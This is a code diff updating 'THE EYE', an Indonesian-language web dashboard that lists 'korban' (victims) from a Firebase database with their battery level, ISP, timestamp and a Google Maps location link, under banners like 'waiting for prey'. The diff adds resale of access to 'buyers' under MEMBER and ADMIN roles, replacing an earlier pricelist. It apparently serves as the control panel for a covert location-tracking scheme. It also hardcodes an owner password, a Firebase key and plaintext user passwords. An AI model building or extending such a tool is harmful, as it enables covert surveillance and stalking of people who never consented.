@@ -3,29 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>THE EYE v18.0 - COMMANDER</title>
+    <title>THE EYE v18.6 - OWNER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --green: #1b5e20; --gold: #ffd700; --red: #d32f2f; }
+        :root { --green: #1b5e20; --gold: #ffd700; --red: #d32f2f; --blue: #1976d2; }
         body { background: #f4f4f4; font-family: sans-serif; margin: 0; padding-bottom: 70px; }
         .header { background: var(--green); color: white; padding: 15px; text-align: center; font-weight: bold; border-bottom: 3px solid var(--gold); position: sticky; top: 0; z-index: 100; }
         .tab-content { display: none; padding: 15px; }
         .active-content { display: block; }
-        .card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 12px; border-left: 5px solid var(--green); }
+        .card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 12px; border-left: 5px solid var(--green); position: relative; }
         .nav-item { display: flex; flex-direction: column; align-items: center; color: #888; font-size: 11px; cursor: pointer; }
         .nav-item.active { color: var(--green); font-weight: bold; }
         .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); border-top-left-radius: 20px; border-top-right-radius: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
-        button { border: none; border-radius: 10px; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; background: var(--green); color: white; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
+        button { border: none; border-radius: 10px; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; background: var(--green); color: white; margin-top: 5px; }
+        .btn-red { background: var(--red); }
+        .btn-blue { background: var(--blue); }
+        .del-x { position: absolute; top: 10px; right: 15px; color: #ccc; font-weight: bold; cursor: pointer; padding: 5px; }
+        table { width: 100%; border-collapse: collapse; font-size: 11px; margin-top: 10px; }
+        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #eee; }
     </style>
 </head>
 <body onload="initApp()">
 
 <div id="login-page" style="display: flex; justify-content: center; align-items: center; height: 95vh;">
     <div class="card" style="width: 280px; text-align: center; border: none;">
-        <h2 style="color:var(--green)">THE EYE v18.0</h2>
-        <input type="text" id="u" placeholder="ID Owner">
+        <h2 style="color:var(--green)">THE EYE v18.6</h2>
+        <input type="text" id="u" placeholder="Username">
         <input type="password" id="p" placeholder="Password">
         <button onclick="doLogin()">AUTHENTICATE</button>
     </div>
@@ -34,23 +39,38 @@
 <div id="app-interface" style="display: none;">
     <div class="header" id="header-title">🛰️ RADAR REALTIME</div>
     <div id="tab-radar" class="tab-content active-content">
-        <div id="log-list">Menghubungkan ke Satelit Singapore...</div>
+        <button class="btn-red" onclick="clearAllLogs()" style="margin-bottom:15px;">🗑️ BERSIHKAN SEMUA TARGET</button>
+        <div id="log-list">Menghubungkan...</div>
     </div>
-    <div id="tab-cuan" class="tab-content">
+    <div id="tab-admin" class="tab-content">
+        <div class="card" style="border-left-color: var(--gold);">
+            <h3>➕ BUAT AKUN BUYER</h3>
+            <input type="text" id="new-u" placeholder="Username Buyer">
+            <input type="text" id="new-p" placeholder="Password Buyer">
+            <select id="new-r">
+                <option value="MEMBER">MEMBER</option>
+                <option value="ADMIN">ADMIN</option>
+            </select>
+            <button class="btn-blue" onclick="createAccount()">AKTIVASI</button>
+        </div>
+        <div id="user-list"></div>
+    </div>
+    <div id="tab-settings" class="tab-content">
         <div class="card">
-            <h3>💰 PRICELIST</h3>
-            <p>Member: 5K | Admin: 8K | Owner: 15K</p>
+            <h3>⚙️ SETTINGS</h3>
+            <p>User: <b id="display-name"></b></p>
             <button onclick="doLogout()" style="background:#444;">LOGOUT</button>
         </div>
     </div>
     <div class="bottom-nav">
         <div class="nav-item active" onclick="switchTab('tab-radar', '🛰️ RADAR', this)"><i>🛰️</i><span>Radar</span></div>
-        <div class="nav-item" onclick="switchTab('tab-cuan', '💰 CUAN', this)"><i>💰</i><span>Cuan</span></div>
+        <div id="nav-admin" class="nav-item" onclick="switchTab('tab-admin', '👥 ADMIN', this)"><i>👥</i><span>Admin</span></div>
+        <div class="nav-item" onclick="switchTab('tab-settings', '⚙️ AKUN', this)"><i>⚙️</i><span>Akun</span></div>
     </div>
 </div>
 
 <script>
-    // CONFIG KALZ TERPASANG 🎯
+    // MASUKKAN CONFIG FIREBASE LU DISINI 🎯
     const firebaseConfig = {
       apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
       authDomain: "theeyes-8d0aa.firebaseapp.com",
@@ -63,19 +83,39 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let logCount = 0;
+    let currentUser = null;
 
-    function initApp() { if(sessionStorage.getItem("user")) renderDashboard(); }
-    function doLogin() {
-        if(document.getElementById('u').value === 'kalz' && document.getElementById('p').value === '111') {
-            sessionStorage.setItem("user", "kalz"); renderDashboard();
-        } else alert("AKSES DITOLAK!");
+    function initApp() {
+        const saved = sessionStorage.getItem("user");
+        if(saved) { currentUser = JSON.parse(saved); renderDashboard(); }
     }
+
+    function doLogin() {
+        const u = document.getElementById('u').value, p = document.getElementById('p').value;
+        if(u === 'kalz' && p === '111') {
+            currentUser = {u: 'kalz', r: 'OWNER'};
+            sessionStorage.setItem("user", JSON.stringify(currentUser));
+            return renderDashboard();
+        }
+        db.ref('users/' + u).once('value', (s) => {
+            const v = s.val();
+            if(v && v.p === p) {
+                currentUser = {u: u, r: v.r};
+                sessionStorage.setItem("user", JSON.stringify(currentUser));
+                renderDashboard();
+            } else alert("SALAH ID/PASS!");
+        });
+    }
+
     function renderDashboard() {
         document.getElementById('login-page').style.display='none';
         document.getElementById('app-interface').style.display='block';
+        document.getElementById('display-name').innerText = currentUser.u;
+        if(currentUser.r !== 'OWNER') document.getElementById('nav-admin').style.display = 'none';
         startRadar();
+        if(currentUser.r === 'OWNER') loadUsers();
     }
+
     function switchTab(id, title, el) {
         document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-content'));
         document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
@@ -83,6 +123,7 @@
         document.getElementById('header-title').innerText = title;
         el.classList.add('active');
     }
+
     function startRadar() {
         db.ref('korban').on('value', (snapshot) => {
             const data = snapshot.val();
@@ -91,15 +132,37 @@
             keys.forEach(id => {
                 const k = data[id];
                 html += `<div class="card" style="border-left-color:var(--red);">
-                    <b style="color:var(--red);">📍 TARGET DETECTED!</b><br>
-                    🕒 ${k.waktu}<br>🔋 Bat: ${k.baterai} | 📶 ISP: ${k.isp}<br>
-                    🌍 <a href="${k.maps}" target="_blank" style="color:blue; font-weight:bold;">BUKA MAPS</a>
+                    <div class="del-x" onclick="deleteSingleLog('${id}')">✖</div>
+                    <b style="color:var(--red);">📍 TARGET TERKUNCI!</b><br>
+                    <small>${k.waktu}</small><hr>
+                    🔋 Bat: ${k.baterai} | 📶 ISP: ${k.isp}<br>
+                    🌍 <a href="${k.maps}" target="_blank" style="color:var(--blue); font-weight:bold;">BUKA MAPS</a>
                 </div>`;
             });
-            document.getElementById('log-list').innerHTML = html || "Menunggu Mangsa...";
-            if(keys.length > logCount) { if(logCount !== 0) alert("🔥 JIRZ! KORBAN BARU!"); logCount = keys.length; }
+            document.getElementById('log-list').innerHTML = html || "Menunggu mangsa...";
         });
     }
+
+    function deleteSingleLog(id) { if(confirm("Hapus target ini?")) db.ref('korban/' + id).remove(); }
+    function clearAllLogs() { if(confirm("HAPUS SEMUA DATA?")) db.ref('korban').remove(); }
+    
+    function createAccount() {
+        const u = document.getElementById('new-u').value, p = document.getElementById('new-p').value, r = document.getElementById('new-r').value;
+        if(u && p) db.ref('users/' + u).set({p: p, r: r}, () => { alert("Sukses!"); loadUsers(); });
+    }
+
+    function loadUsers() {
+        db.ref('users').on('value', (s) => {
+            const users = s.val();
+            let h = "<table><tr><th>USER</th><th>PASS</th><th>AKSI</th></tr>";
+            for(let u in users) {
+                h += `<tr><td>${u}</td><td>${users[u].p}</td><td><button class="btn-red" style="padding:4px;" onclick="deleteUser('${u}')">X</button></td></tr>`;
+            }
+            document.getElementById('user-list').innerHTML = h + "</table>";
+        });
+    }
+
+    function deleteUser(u) { if(confirm("Hapus " + u + "?")) db.ref('users/' + u).remove(); }
     function doLogout() { sessionStorage.clear(); location.reload(); }
 </script>
 </body>
